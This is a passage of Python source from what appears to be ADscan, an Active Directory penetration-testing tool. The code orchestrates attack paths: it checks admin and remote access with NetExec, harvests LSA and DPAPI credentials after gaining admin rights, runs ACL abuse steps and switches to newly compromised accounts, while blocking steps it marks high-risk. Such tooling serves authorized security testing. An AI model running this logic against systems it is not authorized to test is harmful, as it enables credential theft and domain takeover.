    context_username: str | None,
    context_password: str | None,
) -> list[tuple[str, str]]:
    """Collect candidate executor users from prior host-access relations.

    Returns:
        List of ``(username, reason)`` sorted by confidence/priority.
    """
    target_host_clean = str(target_host or "").strip().lower()
    if not target_host_clean:
        return []
    relation_priority = {
        "adminto": 0,
        "sqladmin": 1,
        "canpsremote": 2,
        "canrdp": 3,
    }
    best: dict[str, tuple[tuple[int, int, int], str]] = {}

    for index in range(current_step_index - 1, -1, -1):
        step = steps[index]
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if action not in relation_priority:
            continue
        details = step.get("details") if isinstance(step.get("details"), dict) else {}
        from_label = str(details.get("from") or "").strip()
        to_label = str(details.get("to") or "").strip()
        if not from_label or not to_label:
            continue
        resolved_target = resolve_netexec_target_for_node_label(
            shell, domain, node_label=to_label
        )
        if not isinstance(resolved_target, str) or not resolved_target.strip():
            continue
        if resolved_target.strip().lower() != target_host_clean:
            continue

        users = _resolve_users_from_principal_label(
            shell,
            domain=domain,
            principal_label=from_label,
        )
        if not users:
            continue
        step_status = str(step.get("status") or "discovered").strip().lower()
        status_rank = 0 if step_status == "success" else 1
        distance = current_step_index - index
        relation_rank = relation_priority[action]
        reason = f"{action}:{step_status}"
        for user in users:
            password = _resolve_exec_password_for_user(
                shell,
                domain=domain,
                username=user,
                context_username=context_username,
                context_password=context_password,
            )
            if not password:
                continue
            score = (status_rank, distance, relation_rank)
            existing = best.get(user)
            if existing is None or score < existing[0]:
                best[user] = (score, reason)

    ordered = sorted(best.items(), key=lambda item: (item[1][0], item[0]))
    return [(username, metadata[1]) for username, metadata in ordered]


def _select_candidate_executor_user(
    shell: Any,
    *,
    candidates: list[tuple[str, str]],
) -> str | None:
    """Prompt operator to select candidate executor user when multiple exist."""
    if not candidates:
        return None
    if len(candidates) == 1 or is_non_interactive(shell):
        return candidates[0][0]
    if not hasattr(shell, "_questionary_select"):
        return candidates[0][0]

    options = [
        f"{mark_sensitive(user, 'user')}  [{reason}]"
        for user, reason in candidates
    ]
    options.append("Cancel")
    selected = shell._questionary_select(
        "Select execution user for HasSession step:",
        options,
        default_idx=0,
    )
    if selected is None or selected >= len(options) - 1:
        return None
    return candidates[selected][0]


def _find_previous_adminto_exec_user_for_host(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    current_step_index: int,
    target_host: str,
) -> str | None:
    """Return the best prior AdminTo source user for the same target host.

    Preference order:
    1) nearest previous AdminTo with ``status=success`` and stored credential
    2) nearest previous AdminTo with any status and stored credential
    """
    target_host_clean = str(target_host or "").strip().lower()
    if not target_host_clean:
        return None

    fallback_user: str | None = None
    for index in range(current_step_index - 1, -1, -1):
        step = steps[index]
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if action != "adminto":
            continue
        details = step.get("details") if isinstance(step.get("details"), dict) else {}
        from_label = str(details.get("from") or "").strip()
        to_label = str(details.get("to") or "").strip()
        if not from_label or not to_label:
            continue
        resolved_target = resolve_netexec_target_for_node_label(
            shell, domain, node_label=to_label
        )
        if not isinstance(resolved_target, str) or not resolved_target.strip():
            continue
        if resolved_target.strip().lower() != target_host_clean:
            continue

        candidate_user = _normalize_account(from_label)
        if not _is_valid_domain_username(candidate_user):
            continue
        if not _resolve_domain_password(shell, domain, candidate_user):
            continue

        step_status = str(step.get("status") or "discovered").strip().lower()
        if step_status == "success":
            marked_user = mark_sensitive(candidate_user, "user")
            marked_host = mark_sensitive(target_host, "hostname")
            print_info_debug(
                "[hassession] Selected executor from previous successful AdminTo: "
                f"{marked_user} -> {marked_host}"
            )
            return candidate_user
        if fallback_user is None:
            fallback_user = candidate_user

    if fallback_user:
        marked_user = mark_sensitive(fallback_user, "user")
        marked_host = mark_sensitive(target_host, "hostname")
        print_info_debug(
            "[hassession] Selected executor from previous AdminTo candidate: "
            f"{marked_user} -> {marked_host}"
        )
    return fallback_user


def _resolve_hassession_execution_user(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    steps: list[dict[str, Any]],
    current_step_index: int,
    target_host: str,
    from_label: str,
    context_username: str | None,
    context_password: str | None,
) -> tuple[str | None, str | None, str]:
    """Resolve executor credential context for HasSession exploitation."""
    candidates = _collect_previous_host_access_candidates(
        shell,
        domain=domain,
        steps=steps,
        current_step_index=current_step_index,
        target_host=target_host,
        context_username=context_username,
        context_password=context_password,
    )
    if candidates:
        selected_user = _select_candidate_executor_user(shell, candidates=candidates)
        if not selected_user:
            return None, None, "cancelled"
        password = _resolve_exec_password_for_user(
            shell,
            domain=domain,
            username=selected_user,
            context_username=context_username,
            context_password=context_password,
        )
        if password:
            reason_map = {user: reason for user, reason in candidates}
            return selected_user, password, reason_map.get(
                selected_user, "previous_host_access"
            )

    exec_username = _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )
    if not exec_username:
        return None, None, "unresolved"
    password = _resolve_exec_password_for_user(
        shell,
        domain=domain,
        username=exec_username,
        context_username=context_username,
        context_password=context_password,
    )
    return exec_username, password, "generic_context"


def _resolve_domain_admin_group_candidates(shell: Any, domain: str) -> list[str]:
    """Return candidate localized names for the Domain Admins group."""
    candidates: list[str] = []
    resolved = resolve_group_name_by_rid(shell, domain, 512)
    if isinstance(resolved, str) and resolved.strip():
        candidates.append(resolved.strip())
    candidates.extend(["Domain Admins", "Admins. del dominio"])

    unique: list[str] = []
    seen: set[str] = set()
    for name in candidates:
        normalized = str(name or "").strip()
        key = normalized.lower()
        if not normalized or key in seen:
            continue
        seen.add(key)
        unique.append(normalized)
    return unique


def _resolve_hassession_verify_delay_seconds(shell: Any | None = None) -> float:
    """Return post-add delay before verifying HasSession Domain Admin membership."""
    interactive_default = 0.0 if is_non_interactive(shell) else 3.0
    raw = str(os.getenv("ADSCAN_HASSESSION_VERIFY_DELAY_SECONDS", "")).strip()
    if not raw:
        return interactive_default
    try:
        value = float(raw)
    except ValueError:
        print_info_debug(
            "[hassession] Invalid ADSCAN_HASSESSION_VERIFY_DELAY_SECONDS value; "
            f"using default {interactive_default:.1f}s."
        )
        return interactive_default
    if value < 0:
        return 0.0
    return min(value, 30.0)


def _wait_for_hassession_membership_propagation(
    shell: Any,
    *,
    domain: str,
    target_user: str,
) -> None:
    """Wait briefly for AD membership propagation before verification checks."""
    delay_seconds = _resolve_hassession_verify_delay_seconds(shell)
    if delay_seconds <= 0:
        return
    marked_user = mark_sensitive(target_user, "user")
    marked_domain = mark_sensitive(domain, "domain")
    print_info_debug(
        "[hassession] Waiting "
        f"{delay_seconds:.1f}s before verifying Domain Admin membership for "
        f"{marked_user}@{marked_domain}."
    )
    time.sleep(delay_seconds)


def _is_user_domain_admin_via_sid(
    shell: Any,
    *,
    domain: str,
    target_user: str,
    auth_username: str,
    auth_password: str,
) -> bool | None:
    """Verify Domain Admin membership via recursive LDAP SID resolution."""
    try:
        from adscan_internal.cli.ldap import get_recursive_principal_group_sids_in_chain
        from adscan_internal.services.privileged_group_classifier import (
            classify_privileged_membership_from_group_sids,
        )

        group_sids = get_recursive_principal_group_sids_in_chain(
            shell,
            domain=domain,
            target_samaccountname=target_user,
            auth_username=auth_username,
            auth_password=auth_password,
            retries=4,
            retry_delay_seconds=1.0,
            retry_backoff=1.75,
            retry_on_empty=True,
            prefer_kerberos=True,
            allow_ntlm_fallback=True,
        )
        if group_sids is None:
            return None
        if not group_sids:
            return False
        membership = classify_privileged_membership_from_group_sids(group_sids)
        return bool(membership.domain_admin)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        marked_user = mark_sensitive(target_user, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "[hassession] Failed to verify Domain Admin membership for "
            f"{marked_user}@{marked_domain}: {exc}"
        )
        return None


def _find_next_step_by_action(
    steps: list[dict[str, Any]],
    *,
    start_index: int,
    action_key: str,
) -> tuple[int, dict[str, Any]] | None:
    """Return the next step matching ``action_key`` after ``start_index``."""
    needle = str(action_key or "").strip().lower()
    if not needle:
        return None
    for idx in range(start_index + 1, len(steps)):
        step = steps[idx]
        if not isinstance(step, dict):
            continue
        step_action = str(step.get("action") or "").strip().lower()
        if step_action != needle:
            continue
        return idx, step
    return None


def _attempt_post_adminto_credential_harvest(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    current_step_index: int,
    compromised_host_label: str,
    exec_username: str,
    exec_password: str,
    resolved_target_host: str,
) -> None:
    """Try to harvest host creds after AdminTo when a later GoldenCert needs them.

    This is a best-effort optimization for mixed paths such as:
    ``... -> AdminTo -> COMPUTER$ -> GoldenCert -> Domain``.
    """
    if str(os.getenv("ADSCAN_ATTACK_PATH_POST_ADMINTO_HARVEST", "1")).strip().lower() not in {
        "1",
        "true",
        "yes",
        "on",
    }:
        return

    next_goldencert = _find_next_step_by_action(
        steps, start_index=current_step_index, action_key="goldencert"
    )
    if not next_goldencert:
        return

    _, golden_step = next_goldencert
    golden_status = str(golden_step.get("status") or "discovered").strip().lower()
    if golden_status == "success":
        return

    details = golden_step.get("details") if isinstance(golden_step.get("details"), dict) else {}
    golden_from_label = str(details.get("from") or "").strip()
    if not golden_from_label:
        return

    golden_exec_user = _normalize_account(golden_from_label)
    if not golden_exec_user.endswith("$"):
        return

    if _resolve_domain_password(shell, domain, golden_exec_user):
        return

    host_target = resolved_target_host.strip()
    if not host_target:
        host_target = (
            resolve_netexec_target_for_node_label(
                shell, domain, node_label=compromised_host_label
            )
            or ""
        ).strip()
    if not host_target:
        return

    marked_host = mark_sensitive(host_target, "hostname")
    marked_user = mark_sensitive(golden_exec_user, "user")
    print_info(
        "AdminTo verified. Trying opportunistic host credential collection "
        f"on {marked_host} for upcoming GoldenCert ({marked_user})."
    )

    dump_lsa = getattr(shell, "dump_lsa", None)
    if callable(dump_lsa):
        try:
            try:
                dump_lsa(
                    domain,
                    exec_username,
                    exec_password,
                    host_target,
                    "false",
                    include_machine_accounts=True,
                )
            except TypeError:
                # Backward compatibility for test doubles/older shell shims.
                dump_lsa(domain, exec_username, exec_password, host_target, "false")
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                f"[attack_path] Post-AdminTo LSA harvest failed: {exc}"
            )

    if _resolve_domain_password(shell, domain, golden_exec_user):
        marked_user = mark_sensitive(golden_exec_user, "user")
        print_info(
            f"Recovered credential for {marked_user} after AdminTo host collection."
        )
        return

    dump_dpapi = getattr(shell, "dump_dpapi", None)
    if callable(dump_dpapi):
        try:
            dump_dpapi(domain, exec_username, exec_password, host_target, "false")
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                f"[attack_path] Post-AdminTo DPAPI harvest failed: {exc}"
            )

    if _resolve_domain_password(shell, domain, golden_exec_user):
        marked_user = mark_sensitive(golden_exec_user, "user")
        print_info(
            f"Recovered credential for {marked_user} after AdminTo host collection."
        )
        return

    marked_user = mark_sensitive(golden_exec_user, "user")
    print_warning(
        "AdminTo was successful, but no credential was recovered for "
        f"{marked_user}. GoldenCert may fail."
    )


def execute_selected_attack_path(
    shell: Any,
    domain: str,
    *,
    summary: dict[str, Any],
    context_username: str | None = None,
    context_password: str | None = None,
    search_mode_label: str | None = None,
) -> bool:
    """Execute a selected attack path (best-effort).

    Currently supported step mappings:
    - AllowedToDelegate -> `shell.enum_delegations_user`

    Returns:
        True if an execution attempt was started, False otherwise.
    """
    set_attack_path_execution(shell)
    try:
        is_pivot_search = str(search_mode_label or "").strip().lower() == "pivot search"

        non_executable_actions = CONTEXT_ONLY_RELATIONS
        dangerous_actions = POLICY_BLOCKED_RELATIONS
        supported_actions = SUPPORTED_RELATION_NOTES

        steps = summary.get("steps")

        @contextmanager
        def _active_step_context(
            *,
            action: str,
            from_label: str,
            to_label: str,
            notes: dict[str, object] | None = None,
        ):
            if hasattr(shell, "_set_active_attack_graph_step"):
                shell._set_active_attack_graph_step(  # type: ignore[attr-defined]
                    domain=domain,
                    from_label=from_label,
                    relation=action,
                    to_label=to_label,
                    notes=notes or {},
                )
            try:
                yield
            finally:
                if hasattr(shell, "_clear_active_attack_graph_step"):
                    try:
                        shell._clear_active_attack_graph_step()  # type: ignore[attr-defined]
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

        def _mark_blocked_step(
            action: str,
            from_label: str,
            to_label: str,
            *,
            kind: str,
            reason: str,
        ) -> None:
            if not from_label or not to_label:
                return
            desired_status = "blocked"
            kind_norm = (kind or "").strip().lower()
            if kind_norm == "unavailable":
                desired_status = "unavailable"
            elif kind_norm == "unsupported":
                desired_status = "unsupported"
            try:
                update_edge_status_by_labels(
                    shell,
                    domain,
                    from_label=from_label,
                    relation=action,
                    to_label=to_label,
                    status=desired_status,
                    notes={"blocked_kind": kind, "reason": reason},
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)

        def _mark_blocked_steps(
            *,
            kinds: dict[str, str],
            kind_label: str,
            default_reason: str,
        ) -> None:
            if not isinstance(steps, list):
                return
            for step_item in steps:
                if not isinstance(step_item, dict):
                    continue
                action = str(step_item.get("action") or "").strip()
                key = action.lower()
                if key not in kinds:
                    continue
                details = (
                    step_item.get("details")
                    if isinstance(step_item.get("details"), dict)
                    else {}
                )
                from_label = str(details.get("from") or "")
                to_label = str(details.get("to") or "")
                _mark_blocked_step(
                    action,
                    from_label,
                    to_label,
                    kind=kind_label,
                    reason=kinds.get(key, default_reason),
                )

        actions: list[str] = []
        if isinstance(steps, list):
            for step in steps:
                if isinstance(step, dict):
                    action = str(step.get("action") or "").strip()
                    if action:
                        actions.append(action)
        unique_actions = sorted({a for a in actions}, key=str.lower)

        blocked = [
            a
            for a in unique_actions
            if classify_relation_support(a).kind == "policy_blocked"
        ]
        unsupported = [
            a
            for a in unique_actions
            if classify_relation_support(a).kind == "unsupported"
        ]

        if blocked:
            _mark_blocked_steps(
                kinds={k: v for k, v in dangerous_actions.items()},
                kind_label="dangerous",
                default_reason="High-risk / potentially disruptive",
            )
            table = Table(
                title=Text(
                    "Steps in this path", style=f"bold {BRAND_COLORS['warning']}"
                ),
                show_header=True,
                header_style=f"bold {BRAND_COLORS['warning']}",
                show_lines=True,
            )
            table.add_column("#", style="dim", width=4, justify="right")
            table.add_column("Action", style="bold")
            table.add_column("Executable", style="bold", width=11, justify="center")
            table.add_column("Notes", style="dim", overflow="fold")

            if isinstance(steps, list) and steps:
                for idx, step in enumerate(steps, start=1):
                    action = (
                        str(step.get("action") or "").strip()
                        if isinstance(step, dict)
                        else ""
                    )
                    key = action.lower()
                    if key in supported_actions:
                        executable_label = Text("Yes", style="bold green")
                        notes = supported_actions.get(key, "")
                    elif key in non_executable_actions:
                        executable_label = Text("N/A", style="bold cyan")
                        notes = non_executable_actions.get(key, "")
                    elif key in dangerous_actions:
                        executable_label = Text("No", style="bold yellow")
                        notes = dangerous_actions.get(key, "")
                    else:
                        executable_label = Text("No", style="bold red")
                        notes = "Not implemented yet in ADscan"
                    table.add_row(str(idx), action or "N/A", executable_label, notes)
            else:
                table.add_row(
                    "1", "N/A", Text("No", style="bold red"), "No steps available"
                )

            message = Text()
            message.append(
                "Execution disabled for this attack path.\n\n", style="bold yellow"
            )
            message.append(
                "This path contains high-risk steps that ADscan intentionally does not run automatically.\n",
                style="yellow",
            )
            message.append(
                "You can still inspect the steps and decide if you want to perform them manually.\n",
                style="dim",
            )
            if blocked:
                message.append(
                    f"\nBlocked actions: {', '.join(blocked)}\n",
                    style="dim",
                )

            print_panel(
                [message, table],
                title=Text("Attack Path Execution Disabled", style="bold yellow"),
                border_style="yellow",
                expand=False,
            )
            return False

        if unsupported:
            unsupported_actions = {
                str(action).strip().lower(): "Not implemented yet in ADscan"
                for action in unsupported
            }
            _mark_blocked_steps(
                kinds=unsupported_actions,
                kind_label="unsupported",
                default_reason="Not implemented yet in ADscan",
            )
            table = Table(
                title=Text("Steps in this path", style=f"bold {BRAND_COLORS['info']}"),
                show_header=True,
                header_style=f"bold {BRAND_COLORS['info']}",
                show_lines=True,
            )
            table.add_column("#", style="dim", width=4, justify="right")
            table.add_column("Action", style="bold")
            table.add_column("Supported", style="bold", width=10, justify="center")
            table.add_column("Notes", style="dim", overflow="fold")

            if isinstance(steps, list) and steps:
                for idx, step in enumerate(steps, start=1):
                    action = (
                        str(step.get("action") or "").strip()
                        if isinstance(step, dict)
                        else ""
                    )
                    key = action.lower()
                    if key in supported_actions:
                        supported_label = Text("Yes", style="bold green")
                        notes = supported_actions.get(key, "")
                    elif key in non_executable_actions:
                        supported_label = Text("N/A", style="bold cyan")
                        notes = non_executable_actions.get(key, "")
                    elif key in dangerous_actions:
                        supported_label = Text("No", style="bold yellow")
                        notes = dangerous_actions.get(key, "")
                    else:
                        supported_label = Text("No", style="bold red")
                        notes = "Not implemented yet in ADscan"
                    table.add_row(str(idx), action or "N/A", supported_label, notes)
            else:
                table.add_row(
                    "1", "N/A", Text("No", style="bold red"), "No steps available"
                )

            message = Text()
            message.append(
                "This attack path can't be executed yet.\n\n", style="bold red"
            )
            message.append(
                "ADscan does not have an exploitation implementation for this path yet. "
                "You can still inspect it and choose another one.\n",
                style="red",
            )
            if unique_actions:
                message.append(
                    f"\nDetected actions: {', '.join(unique_actions)}\n",
                    style="dim",
                )
            message.append(
                "\nTip: pick a path that contains only supported actions, "
                "or continue with other enumeration steps.",
                style="dim",
            )

            print_panel(
                [message, table],
                title=Text("Attack Path Not Implemented", style="bold red"),
                border_style="red",
                expand=False,
            )
            return False

        execution_started = False
        if not isinstance(steps, list) or not steps:
            print_warning("Cannot execute this path: no steps available.")
            return False

        # Precompute the last executable step index to avoid offering follow-ups
        # in the middle of a path (which can cause duplication or re-ordering).
        executable_indices: list[int] = []
        for step_idx, step_item in enumerate(steps, start=1):
            if not isinstance(step_item, dict):
                continue
            step_action = str(step_item.get("action") or "").strip()
            step_key = step_action.lower()
            if step_key in non_executable_actions:
                continue
            if step_key in dangerous_actions:
                continue
            executable_indices.append(step_idx)
        last_executable_idx = executable_indices[-1] if executable_indices else 0
        resume_from_step_idx = _resolve_attack_path_start_step(
            shell,
            steps=steps,
            executable_indices=executable_indices,
            non_executable_actions=non_executable_actions,
            dangerous_actions=dangerous_actions,
        )
        if resume_from_step_idx is None:
            return False

        def _run_runtime_followups(
            *,
            step_action: str,
            target_label_value: str,
            initial_followups: list[Any] | None = None,
            last_outcome: dict[str, Any] | None = None,
        ) -> None:
            """Render and execute runtime follow-ups for a successful terminal step."""
            followups = list(initial_followups or [])
            outcome_followups: list[Any] = []
            effective_outcome = (
                dict(last_outcome)
                if isinstance(last_outcome, dict)
                else (get_last_ace_execution_outcome(shell) or {})
            )
            marked_outcome_domain = mark_sensitive(domain, "domain")
            print_info_debug(
                "[attack_paths] outcome follow-up evaluation: "
                f"domain={marked_outcome_domain} pivot={is_pivot_search!r} "
                f"outcome_key={mark_sensitive(str(effective_outcome.get('key') or 'none'), 'detail')}"
            )
            if is_pivot_search:
                if (
                    str(effective_outcome.get("key") or "").strip().lower()
                    != "user_credential_obtained"
                ):
                    outcome_followups = build_followups_for_execution_outcome(
                        shell,
                        outcome=effective_outcome,
                    )
                print_info_debug(
                    "[attack_paths] outcome follow-ups resolved: "
                    f"domain={marked_outcome_domain} count={len(outcome_followups)}"
                )
            if outcome_followups:
                mandatory_outcome_followups = [
                    item for item in outcome_followups if item.key == "refresh_ticket"
                ]
                optional_outcome_followups = [
                    item for item in outcome_followups if item.key != "refresh_ticket"
                ]
                for item in mandatory_outcome_followups:
                    item.handler()
                followups.extend(optional_outcome_followups)
            if not followups:
                return

            execute_guided_followup_actions(
                shell,
                step_action=step_action,
                target_label=target_label_value,
                followups=followups,
            )

        def _apply_execution_outcome_context_handoff(
            outcome: dict[str, Any] | None,
        ) -> None:
            """Update the in-path execution context after obtaining a new user credential."""
            nonlocal context_username, context_password

            if not isinstance(outcome, dict):
                return
            if str(outcome.get("key") or "").strip().lower() != "user_credential_obtained":
                return

            compromised_user = _normalize_account(
                str(outcome.get("compromised_user") or "")
            )
            credential = str(outcome.get("credential") or "").strip()
            if not compromised_user or not credential:
                print_info_debug(
                    "[attack_paths] skipping execution-context handoff for user outcome "
                    "(missing compromised_user or credential)."
                )
                return

            previous_user = _normalize_account(context_username or "")
            context_username = compromised_user
            context_password = credential
            marked_user = mark_sensitive(compromised_user, "user")
            print_info_debug(
                "[attack_paths] execution context handed off to newly compromised user: "
                f"previous_user={mark_sensitive(previous_user or 'none', 'detail')} "
                f"new_user={marked_user}"
            )

        for idx, step in enumerate(steps, start=1):
            if not isinstance(step, dict):
                continue
            if idx < resume_from_step_idx:
                continue
            action = str(step.get("action") or "").strip()
            key = action.lower()
            if key in non_executable_actions:
                # Context-only edge (e.g. membership expansion), skip execution.
                continue
            if key in dangerous_actions:
                # High-risk step intentionally disabled.
                return execution_started
            set_attack_path_step_context(
                shell,
                search_mode_label=search_mode_label,
                step_index=idx,
                last_executable_idx=last_executable_idx,
            )
            details = (
                step.get("details") if isinstance(step.get("details"), dict) else {}
            )
            from_label = str(details.get("from") or "")
            to_label = str(details.get("to") or "")

            if key in {"adminto", "sqladmin", "canrdp", "canpsremote"}:
                if not to_label:
                    print_warning(f"Cannot execute {action}: missing target host.")
                    return execution_started

                # Prefer the credential context (e.g. from `ask_for_user_privs`). Otherwise,
                # attempt to use the credential for the source node, and finally fall back
                # to one of the "applies_to" usernames when available (owned/group paths).
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    print_warning(
                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing credential context for execution",
                    )
                    return execution_started

                # Resolve a usable NetExec target (FQDN), falling back when needed.
                target_host = resolve_netexec_target_for_node_label(
                    shell, domain, node_label=to_label
                )
                if not isinstance(target_host, str) or not target_host.strip():
                    print_warning(
                        f"Cannot execute {action}: target node is not a resolvable host."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Target node is not a resolvable host",
                    )
                    return execution_started
                target_host = target_host.strip()

                service_map: dict[str, str] = {
                    "adminto": "smb",
                    "sqladmin": "mssql",
                    "canrdp": "rdp",
                    "canpsremote": "winrm",
                }
                service = service_map[key]

                if not hasattr(shell, "run_service_command"):
                    print_warning(
                        "Cannot execute this step: NetExec privilege checker is unavailable."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Execution helper unavailable (NetExec missing)",
                    )
                    return execution_started

                auth = shell.build_auth_nxc(
                    exec_username, password, domain, kerberos=False
                )
                log_file = (
                    f"domains/{domain}/{service}/verify_{exec_username}_{service}.log"
                )
                command = (
                    f"{shell.netexec_path} {service} {target_host} {auth} "
                    f"--timeout 30 --log {log_file}"
                )
                print_info_verbose(f"Command: {command}")

                execution_started = True
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username, "target": target_host},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action,
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username, "target": target_host},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    ok = shell.run_service_command(
                        command,
                        domain,
                        service,
                        exec_username,
                        password,
                        return_boolean=True,
                    )
                    if not ok:
                        marked_host = mark_sensitive(target_host, "hostname")
                        print_warning(
                            f"{action} check did not confirm access on {marked_host}. Stopping this path."
                        )
                        return True

                    update_edge_status_by_labels(
                        shell,
                        domain,
                        from_label=from_label,
                        relation=action,
                        to_label=to_label,
                        status="success",
                        notes={"username": exec_username, "target": target_host},
                    )

                    if key == "adminto":
                        _attempt_post_adminto_credential_harvest(
                            shell,
                            domain=domain,
                            steps=steps,
                            current_step_index=idx - 1,
                            compromised_host_label=to_label,
                            exec_username=exec_username,
                            exec_password=password,
                            resolved_target_host=target_host,
                        )

                    followup = getattr(shell, f"ask_for_{service}_access", None)
                    if callable(followup):
                        followup(domain, target_host, exec_username, password)
                continue

            if key in ACL_ACE_RELATIONS:
                if not from_label or not to_label:
                    print_warning(f"Cannot execute {action}: missing from/to details.")
                    return execution_started

                exec_context = build_ace_step_context(
                    shell,
                    domain,
                    relation=key,
                    summary=summary,
                    from_label=from_label,
                    to_label=to_label,
                    context_username=context_username,
                    context_password=context_password,
                )
                if not exec_context:
                    marked_from = mark_sensitive(from_label, "node")
                    marked_to = mark_sensitive(to_label, "node")
                    print_warning(
                        f"Cannot execute {action} ({marked_from} -> {marked_to}): "
                        "no usable execution credential context available."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="No usable execution credential context available",
                    )
                    return execution_started

                supported, reason = describe_ace_step_support(exec_context)
                if not supported:
                    # Show the same "not implemented" UX: action is mapped in general,
                    # but not for this target object type.
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unsupported",
                        reason=reason or "Not supported for this target type",
                    )
                    table = Table(
                        title=Text(
                            "Steps in this path", style=f"bold {BRAND_COLORS['info']}"
                        ),
                        show_header=True,
                        header_style=f"bold {BRAND_COLORS['info']}",
                        show_lines=True,
                    )
                    table.add_column("#", style="dim", width=4, justify="right")
                    table.add_column("Action", style="bold")
                    table.add_column(
                        "Supported", style="bold", width=10, justify="center"
                    )
                    table.add_column("Notes", style="dim", overflow="fold")

                    for step_idx, step_item in enumerate(steps, start=1):
                        if not isinstance(step_item, dict):
                            continue
                        step_action = str(step_item.get("action") or "").strip()
                        step_key = step_action.lower()

                        if step_idx == idx:
                            supported_label = Text("No", style="bold red")
                            notes = reason or "Not implemented for this target type"
                        elif step_key in supported_actions:
                            supported_label = Text("Yes", style="bold green")
                            notes = supported_actions.get(step_key, "")
                        elif step_key in non_executable_actions:
                            supported_label = Text("N/A", style="bold cyan")
                            notes = non_executable_actions.get(step_key, "")
                        elif step_key in dangerous_actions:
                            supported_label = Text("No", style="bold yellow")
                            notes = dangerous_actions.get(step_key, "")
                        else:
                            supported_label = Text("No", style="bold red")
                            notes = "Not implemented yet in ADscan"
                        table.add_row(
                            str(step_idx), step_action or "N/A", supported_label, notes
                        )

                    message = Text()
                    message.append(
                        "This attack path can't be executed yet.\n\n", style="bold red"
                    )
                    message.append(
                        "ADscan recognizes this action, but it is not implemented for the "
                        "target object type in this path.\n",
                        style="red",
                    )
                    marked_to = mark_sensitive(to_label, "node")
                    message.append(
                        f"\nUnsupported step: {action} -> {marked_to}\n",
                        style="dim",
                    )
                    if reason:
                        message.append(f"\nReason: {reason}\n", style="dim")
                    message.append(
                        "\nTip: pick a path that contains only supported steps for the "
                        "target types, or continue with other enumeration steps.",
                        style="dim",
                    )

                    print_panel(
                        [message, table],
                        title=Text("Attack Path Not Implemented", style="bold red"),
                        border_style="red",
                        expand=False,
                    )
                    return False

                execution_started = True
                with _active_step_context(
                    action=action,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"user": exec_context.exec_username},
                ):
                    try:
                        if hasattr(shell, "_update_active_attack_graph_step_status"):
                            shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                domain=domain,
                                status="attempted",
                                notes={"user": exec_context.exec_username},
                            )
                        else:
                            update_edge_status_by_labels(
                                shell,
                                domain,
                                from_label=from_label,
                                relation=action,
                                to_label=to_label,
                                status="attempted",
                                notes={"user": exec_context.exec_username},
                            )

                        ace_result = execute_ace_step(shell, context=exec_context)
                        last_outcome = get_last_ace_execution_outcome(shell) or {}
                        _apply_execution_outcome_context_handoff(last_outcome)
                        offer_followups = (
                            idx == last_executable_idx and ace_result is True
                        )
                        if ace_result is True:
                            if hasattr(
                                shell, "_update_active_attack_graph_step_status"
                            ):
                                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                    domain=domain,
                                    status="success",
                                    notes={"user": exec_context.exec_username},
                                )
                            else:
                                update_edge_status_by_labels(
                                    shell,
                                    domain,
                                    from_label=from_label,
                                    relation=action,
                                    to_label=to_label,
                                    status="success",
                                    notes={"user": exec_context.exec_username},
                                )
                        elif ace_result is False:
                            if hasattr(
                                shell, "_update_active_attack_graph_step_status"
                            ):
                                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                    domain=domain,
                                    status="failed",
                                    notes={"user": exec_context.exec_username},
                                )
                            else:
                                update_edge_status_by_labels(
                                    shell,
                                    domain,
                                    from_label=from_label,
                                    relation=action,
                                    to_label=to_label,
                                    status="failed",
                                    notes={"user": exec_context.exec_username},
                                )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                        print_warning(f"Error while executing {action} step.")
                        print_exception(show_locals=False, exception=exc)
                        if hasattr(shell, "_update_active_attack_graph_step_status"):
                            try:
                                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                    domain=domain,
                                    status="failed",
                                    notes={"error": str(exc)},
                                )
                            except Exception as exc2:  # noqa: BLE001
                                telemetry.capture_exception(exc2)

                if offer_followups:
                    followups = build_followups_for_step(
                        shell,
                        domain=domain,
                        step_action=key,
                        exec_username=exec_context.exec_username,
                        exec_password=exec_context.exec_password,
                        target_kind=exec_context.target_kind,
                        target_label=to_label or exec_context.target_sam_or_label,
                        target_domain=exec_context.target_domain,
                        target_sam_or_label=exec_context.target_sam_or_label,
                    )
                    _run_runtime_followups(
                        step_action=action,
